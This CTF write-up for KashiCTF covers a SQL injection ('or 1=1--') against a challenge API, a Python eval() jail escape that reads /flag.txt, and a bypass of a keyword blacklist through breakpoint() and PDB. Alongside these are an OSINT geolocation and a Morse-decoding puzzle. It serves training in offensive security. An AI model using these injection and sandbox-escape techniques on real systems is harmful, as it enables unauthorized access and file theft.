## Web

### Corporate Life 1

Examining the `_buildManifest.js` we see the directory `/v2-testing` which fetches `/api/list-v2` where the request payload is JSON with a filter value that is suspectible to SQL injection. Sending `' or 1=1--` yields lots of JSON, with the flag in one of the entries:

```
...
	{
		"employee_name": "peter.johnson",
		"request_detail": "Shitty job, I hate working here, I will leak all important information like KashiCTF{s4m3_old_c0rp0_l1f3_8oMKsKIH}",
		"status": "denied",
		"department": "Logistics",
		"role": "Supply Chain Manager",
		"email": "peter.johnson@corp.com"
	},
...
```

## OSINT

### Who am I ??

![picture](/assets/Road_Not_Taken.jpg)

Immediately we know that we are in Budapest, Hungary because of the particular [phone number](https://en.wikipedia.org/wiki/Telephone_numbers_in_Hungary) visible on the storefront. Looking up the domain of the email address `dh.hu`, we are led to a website for Duna House. Looking up "bazilika" Duna House on Google leads to the store, which is on the street "Bajcsy-Zsilinszky" apparently named after the politician "Endre Kálmán Bajcsy-Zsilinszky." Trying a bunch of different name orders, `KashiCTF{Endre_Bajcsy_Zsilinszky}` is our flag.

## MISC

### Easy Jail

Notice the unsafe use of `eval()` in the following Python code,

```
def calc(op):
	try : 	
		res = eval(op)
	except :
		return print("Wrong operation")
	return print(f"{op} --> {res}")

def main():
	while True :
		inp = input(">> ")
		calc(inp)
```

Entering `open('/flag.txt').read()` gets the flag `KashiCTF{3V4L_41NT_54F3_Pn0q6Yii}`.

### Easy Jail 2

This is the same as the last challenge, but there's a blacklist of words we cannot use, such that if the input string contains as a substring one of these sequences, then the program ignores the request:

```
["open", "input", "eval", "exec", "import", "getattr", "sh", "builtins", "global"]
```

Luckily, `breakpoint()` is not blocked. So, we can spawn a PDB debugger and evaluate our expression in there.

```
kjc@kjc:~$ nc kashictf.iitbhucybersec.in 58823
           _            _       _

(Pdb) p open('/flag.txt').read()
'KashiCTF{C4N_S71LL_CL3AR_8L4CKL15T_6UyAkh7s}\n'
(Pdb)
```

## Crypto

### Lost Frequencies

We are given this:

```
111 0000 10 111 1000 00 10 01 010 1011 11 111 010 000 0
```

Where 1 is long, 0 is short so we can just decode the morse code to get the string "ohnobinarymorse".
